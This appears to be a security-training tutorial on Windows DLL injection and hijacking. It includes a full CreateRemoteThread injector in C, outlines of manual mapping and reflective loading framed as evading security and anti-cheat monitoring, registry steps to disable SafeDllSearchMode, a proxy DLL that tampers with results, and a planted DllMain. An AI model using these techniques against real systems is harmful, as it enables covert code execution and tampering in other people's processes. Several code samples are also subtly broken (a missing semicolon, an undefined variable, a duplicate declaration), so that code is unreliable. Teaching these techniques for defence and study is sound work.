`DLL injection` is a method that involves inserting a piece of code, structured as a Dynamic Link Library (DLL), into a running process. This allows the inserted code to run within the process's context, influencing its behaviour or accessing its resources.

A prime example of legitimate use of DLL Injections is [Azure's use of hot patching for updating operational servers](https://learn.microsoft.com/en-us/azure/automanage/automanage-hotpatch#how-hotpatch-works), which facilitates the benefits of the update without necessitating server downtime. This technique is effective in evading detection.

## LoadLibrary

The `LoadLibrary` API is a function provided by the Windows operating system that loads a Dynamic Link Library (DLL) into the current process’s memory and returns a handle that can be used to get the addresses of functions within the DLL.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary to load a DLL into the current process
    HMODULE hModule = LoadLibrary("example.dll");
    if (hModule == NULL) {
        printf("Failed to load example.dll\n");
        return -1;
    }
    printf("Successfully loaded example.dll\n");

    return 0;
}
```

Loading a DLL using `LoadLibrary` legitimately above.

```c
#include <windows.h>
#include <stdio.h>

int main() {
    // Using LoadLibrary for DLL injection
    // First, we need to get a handle to the target process
    DWORD targetProcessId = 123456 // The ID of the target process
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, targetProcessId);
    if (hProcess == NULL) {
        printf("Failed to open target process\n");
        return -1;
    }

    // Next, we need to allocate memory in the target process for the DLL path
    LPVOID dllPathAddressInRemoteMemory = VirtualAllocEx(hProcess, NULL, strlen(dllPath), MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (dllPathAddressInRemoteMemory == NULL) {
        printf("Failed to allocate memory in target process\n");
        return -1;
    }

    // Write the DLL path to the allocated memory in the target process
    BOOL succeededWriting = WriteProcessMemory(hProcess, dllPathAddressInRemoteMemory, dllPath, strlen(dllPath), NULL);
    if (!succeededWriting) {
        printf("Failed to write DLL path to target process\n");
        return -1;
    }

    // Get the address of LoadLibrary in kernel32.dll
    LPVOID loadLibraryAddress = (LPVOID)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");
    if (loadLibraryAddress == NULL) {
        printf("Failed to get address of LoadLibraryA\n");
        return -1;
    }

    // Create a remote thread in the target process that starts at LoadLibrary and points to the DLL path
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)loadLibraryAddress, dllPathAddressInRemoteMemory, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create remote thread in target process\n");
        return -1;
    }

    printf("Successfully injected example.dll into target process\n");

    return 0;
}
```

This above is use of `LoadLibrary` for DLL Injection. This process involves allocating memory within the target process for the DLL path and then initiating a remote thread that begins at `LoadLibrary` and directs towards the DLL path.

## Manual Mapping

`Manual Mapping` is an incredibly complex and advanced method of DLL injection. It involves the manual loading of a DLL into a process's memory and resolves its imports and re-locations. However, it avoids easy detection by not using the `LoadLibrary` function, whose usage is monitored by security and anti-cheat systems.

A simplified outline of the process can be represented as follows:

1. Load the DLL as raw data into the injecting process.
2. Map the DLL sections into the targeted process.
3. Inject shellcode into the target process and execute it. This shellcode relocates the DLL, rectifies the imports, executes the Thread Local Storage (TLS) callbacks, and finally calls the DLL main.

## Reflective DLL Injection

`Reflective DLL injection` utilizes reflective programming to load a library from memory into a host process. The library itself is responsible for its loading process by implementing a minimal Portable Executable file loader allowing it to decide how it loads and interact with the host, minimising interaction with the host system, process.

[Stephen Fewer has a great GitHub](https://github.com/stephenfewer/ReflectiveDLLInjection) demonstrating the technique.

"The procedure of remotely injecting a library into a process is two-fold. First, the library you aim to inject must be written into the target process’s address space (hereafter referred to as the 'host process'). Second, the library must be loaded into the host process to meet the library's runtime expectations, such as resolving its imports or relocating it to an appropriate location in memory.

Assuming we have code execution in the host process and the library we aim to inject has been written into an arbitrary memory location in the host process, Reflective DLL Injection functions as follows.

1. Execution control is transferred to the library's `ReflectiveLoader` function, an exported function found in the library's export table. This can happen either via `CreateRemoteThread()` or a minimal bootstrap shellcode.
2. As the library's image currently resides in an arbitrary memory location, the `ReflectiveLoader` initially calculates its own image's current memory location to parse its own headers for later use.
3. The `ReflectiveLoader` then parses the host process's `kernel32.dll` export table to calculate the addresses of three functions needed by the loader, namely `LoadLibraryA`, `GetProcAddress`, and `VirtualAlloc`.
4. The `ReflectiveLoader` now allocates a continuous memory region where it will proceed to load its own image. The location isn't crucial; the loader will correctly relocate the image later.
5. The library's headers and sections are loaded into their new memory locations.
6. The `ReflectiveLoader` then processes the newly loaded copy of its image's import table, loading any additional libraries and resolving their respective imported function addresses.
7. The `ReflectiveLoader` then processes the newly loaded copy of its image's relocation table.
8. The `ReflectiveLoader` then calls its newly loaded image's entry point function, `DllMain,` with `DLL_PROCESS_ATTACH`. The library has now been successfully loaded into memory.
9. Finally, the `ReflectiveLoader` returns execution to the initial bootstrap shellcode that called it, or if it were called via `CreateRemoteThread`, the thread would terminate."

## DLL Hijacking

`DLL Hijacking` is an exploitation technique where an attacker capitalizes on the Windows DLL loading process. These DLLs can be loaded during runtime, creating a hijacking opportunity if an application doesn't specify the full path to a required DLL.

### Safe DLL Search Mode 

The default DLL search order used by the system depends on whether `Safe DLL Search Mode` is activated. When enabled (which is the default setting), Safe DLL Search Mode repositions the user's current directory further down in the search order. It’s easy to either enable or disable the setting by editing the registry.

1. Navigate to `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Session Manager`.
2. In the right pane, look for the `SafeDllSearchMode` value. If it does not exist, right-click the blank space of the folder or right-click the `Session Manager` folder, select `New` and then `DWORD (32-bit) Value`. Name this new value as `SafeDllSearchMode`.
3. Double-click `SafeDllSearchMode`. In the Value data field, enter `1` to enable and `0` to disable Safe DLL Search Mode.

With this mode enabled, applications search for necessary DLL files in the following sequence:

1. The directory from which the application is loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.

However, if 'Safe DLL Search Mode' is deactivated, the search order changes to:

1. The directory from which the application is loaded.
2. The current directory.
3. The system directory.
4. The 16-bit system directory.
5. The Windows directory
6. The directories that are listed in the PATH environment variable

## Hijacking Example

First, you need to pinpoint a DLL the target is attempting to locate:

1. `Process Explorer`: Part of Microsoft's Sysinternals suite, this tool offers detailed information on running processes, including their loaded DLLs. By selecting a process and inspecting its properties, you can view its DLLs.
2. `PE Explorer`: This Portable Executable (PE) Explorer can open and examine a PE file (such as a .exe or .dll). Among other features, it reveals the DLLs from which the file imports functionality.

After identifying a DLL, we need to determine which functions we want to modify, which necessitates reverse engineering tools, such as disassemblers and debuggers.

```c
#include <stdio.h>
#include <stdlib.h>
#include <stdbool.h>
#include <windows.h>

typedef int (*AddFunc)(int, int);

int readIntegerInput()
{
    int value;
    char input[100];
    bool isValid = false;

    while (!isValid)
    {
        fgets(input, sizeof(input), stdin);

        if (sscanf(input, "%d", &value) == 1)
        {
            isValid = true;
        }
        else
        {
            printf("Invalid input. Please enter an integer: ");
        }
    }

    return value;
}

int main()
{
    HMODULE hLibrary = LoadLibrary("library.dll");
    if (hLibrary == NULL)
    {
        printf("Failed to load library.dll\n");
        return 1;
    }

    AddFunc add = (AddFunc)GetProcAddress(hLibrary, "Add");
    if (add == NULL)
    {
        printf("Failed to locate the 'Add' function\n");
        FreeLibrary(hLibrary);
        return 1;
    }
    HMODULE hLibrary = LoadLibrary("x.dll");

    printf("Enter the first number: ");
    int a = readIntegerInput();

    printf("Enter the second number: ");
    int b = readIntegerInput();

    int result = add(a, b);
    printf("The sum of %d and %d is %d\n", a, b, result);

    FreeLibrary(hLibrary);
    system("pause");
    return 0;
}
```

It loads an `add` function from the `library.dll` and utilises this function to add two numbers. in Process Monitor (procmon), we can observe the process of loading the `library.dll` located in the same directory. Filer by `main.exe` in procmon.

```Tip
It is important to note that procmon only captures information while it is actively running. Therefore, if your log appears empty, you should close `main.exe` and reopen it while procmon is running. This will ensure that the necessary information is captured and available for analysis.
```

Filter for an `Operation` of `Load Image` to only get the libraries the app is loading.

### Proxying

We will create a new library that will load the function `Add` from `library.dll`, tamper with it, and then return it to `main.exe`.

1. Create a new library: We will create a new library serving as the proxy for `library.dll`. This library will contain the necessary code to load the `Add` function from `library.dll` and perform the required tampering.
2. Load the `Add` function: Within the new library, we will load the `Add` function from the original `library.dll`. This will allow us to access the original function.
3. Tamper with the function: Once the `Add` function is loaded, we can then apply the desired tampering or modifications to its result. In this case, we are simply going to modify the result of the addition, to add `+ 1` to the result.
4. Return the modified function: After completing the tampering process, we will return the modified `Add` function from the new library back to `main.exe`. This will ensure that when `main.exe` calls the `Add` function, it will execute the modified version with the intended changes.

```c
// tamper.c
#include <stdio.h>
#include <Windows.h>

#ifdef _WIN32
#define DLL_EXPORT __declspec(dllexport)
#else
#define DLL_EXPORT
#endif

typedef int (*AddFunc)(int, int);

DLL_EXPORT int Add(int a, int b)
{
    // Load the original library containing the Add function
    HMODULE originalLibrary = LoadLibraryA("library.o.dll");
    if (originalLibrary != NULL)
    {
        // Get the address of the original Add function from the library
        AddFunc originalAdd = (AddFunc)GetProcAddress(originalLibrary, "Add");
        if (originalAdd != NULL)
        {
            printf("============ HIJACKED ============\n");
            // Call the original Add function with the provided arguments
            int result = originalAdd(a, b);
            // Tamper with the result by adding +1
            printf("= Adding 1 to the sum to be evil\n");
            result += 1;
            printf("============ RETURN ============\n");
            // Return the tampered result
            return result;
        }
    }
    // Return -1 if the original library or function cannot be loaded
    return -1;
}
```

Compile it and rename `library.dll` to `library.o.dll`, and this to `library.dll`.

### Invalid Libraries

Another option to execute a DLL Hijack attack is to replace a valid library the program is attempting to load but cannot find with a crafted library. 

If we change the procmon filter to focus on entries whose path ends in `.dll` and has a status of `NAME NOT FOUND` we can find such libraries in `main.exe`. Example:

```sh
17:55:39,7848570 main.exe 37940 CreateFile C:\Users\PandaSt0rm\Desktop\Hijack\x.dll NAME NOT FOUND Desired Access: Read Attributes, Disposition: Open, Options: Open Reparse Point, Attributes: n/a, ShareMode: Read, Write, Delete, AllocationSize: n/a
```

It is looking to load `x.dll` from the app directory. We can take advantage of this and load our own code, with very little context of what it is looking for in `x.dll`.

```c
#include <stdio.h>
#include <Windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved)
{
    switch (ul_reason_for_call)
    {
    case DLL_PROCESS_ATTACH:
    {
        printf("Hijacked... Oops...\n");
    }
    break;
    case DLL_PROCESS_DETACH:
        break;
    case DLL_THREAD_ATTACH:
        break;
    case DLL_THREAD_DETACH:
        break;
    }
    return TRUE;
}
```

This code defines a DLL entry point function called `DllMain` that is automatically called by Windows when the DLL is loaded into a process. When the library is loaded, it will simply print `Hijacked... Oops...` to the terminal, but you could theoretically do anything here.

Compile it and rename `hijack.dll` to `x.dll`, and run `main.exe`.
